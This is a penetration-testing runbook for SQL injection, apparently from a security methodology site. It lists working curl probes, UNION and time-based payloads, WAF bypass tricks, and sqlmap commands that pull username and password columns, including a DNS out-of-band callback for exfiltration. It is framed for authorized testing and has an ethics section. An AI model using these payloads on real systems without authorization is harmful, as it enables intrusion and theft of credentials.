---
title: "SQL Injection"
description: "From a single quote to a database dump: detection, union and blind techniques, WAF bypass, and extracting data without breaking production."
phase: Web
order: 3
tags:
  - sqli
  - database
  - injection
  - owasp
tools:
  - sqlmap
  - curl
  - ffuf
updated: 2026-10-01
---

A runbook for authorized SQL injection testing on **in-scope** targets. Goal: confirm input reaches a query, identify the DBMS, and extract a single proof row — then stop.

## 1. Build a candidate list

Collect every parameterized endpoint and worth-testing parameter.

```bash
gau target.com | grep '=' | sort -u > urls.txt
katana -u https://target.com -d 3 -silent | grep '=' | sort -u | tee -a urls.txt
```

## 2. Hand-probe for differences

Send harmless probes and compare responses carefully.

```bash
# Baseline
curl -s "https://target/item?id=1" -o base.txt

# True vs false conditions; look for differing body length or content
curl -s "https://target/item?id=1' AND '1'='1" -o true.txt
curl -s "https://target/item?id=1' AND '1'='2" -o false.txt
diff base.txt false.txt

# Time-based confirmation
time curl -s "https://target/item?id=1' AND SLEEP(5)-- -"
```

Clues: DB error text, boolean response differences, timing shifts, or `ORDER BY` breaking output.

## 3. Fuzz for the injection point

Scan parameters at scale for error- or boolean-triggering payloads.

```bash
cat urls.txt | qsreplace "1'\"()" | ffuf -u FUZZ -w - -mc all -fs 0 -s
```

Note which single parameter reacts — filters are often on one field only.

## 4. Identify the DBMS and column count

```bash
# Column count via ORDER BY (increment until error)
curl -s "https://target/item?id=1' ORDER BY 3-- -"
# UNION marker placement
curl -s "https://target/item?id=1' UNION SELECT 1,2,3-- -"
```

Then fingerprint the backend through error messages or `@@version` / `version()`.

## 5. Confirm and extract with sqlmap

Use sqlmap only to confirm and pull the minimum you already mapped manually.

```bash
sqlmap -u "https://target/item?id=1" \
  --batch --threads=2 --risk=1 --level=2 \
  --dbms=mysql --technique=BEU \
  --current-db --current-user --dbs

# Tables, then columns, then a single row — never --dump-all
sqlmap -u "https://target/item?id=1" --batch -D appdb --tables
sqlmap -u "https://target/item?id=1" --batch -D appdb -T users --columns
sqlmap -u "https://target/item?id=1" --batch -D appdb -T users -C username,password --limit 1
```

When there is no output, extract one bit at a time or force a callback:

```bash
sqlmap -u "https://target/item?id=1" --batch --technique=B --string="true"
sqlmap -u "https://target/item?id=1" --batch --technique=T --dns-domain=your.oast.fun
```

## 6. WAF and filter bypass

- Comments: `/**/`, `/*!50000SELECT*/`. Case/spacing: mixed case, tabs, `%0a`.
- Encoding: double URL-encoding, hex literals, `CHAR()`.
- Equivalent syntax: `||` vs `OR`, `LIKE` vs `=`, `BETWEEN` vs `>=`.

Feed the working variant to sqlmap with `--tamper=` (e.g. `space2comment,between`).

## Full pipeline

```bash
# 1. Candidates
gau target.com | grep '=' | sort -u > urls.txt
katana -u https://target.com -d 3 -silent | grep '=' | sort -u | tee -a urls.txt

# 2. Hand-probe true/false and timing
curl -s "https://target/item?id=1' AND '1'='1" -o true.txt
curl -s "https://target/item?id=1' AND '1'='2" -o false.txt
diff true.txt false.txt

# 3. Confirm, fingerprint, and pull one proof row
sqlmap -u "https://target/item?id=1" --batch --threads=2 --level=2 --risk=1 \
  --current-db --current-user --dbs
sqlmap -u "https://target/item?id=1" --batch -D appdb -T users -C username,password --limit 1
```

## Ethics & legality

- Only test targets with written authorization; never run destructive statements (`DROP`/`UPDATE`/`DELETE`).
- Extract a single proof row, keep threads low, and avoid `--dump-all` and `--os-shell`.
- Log every request as evidence and redact any personal data pulled during proof.
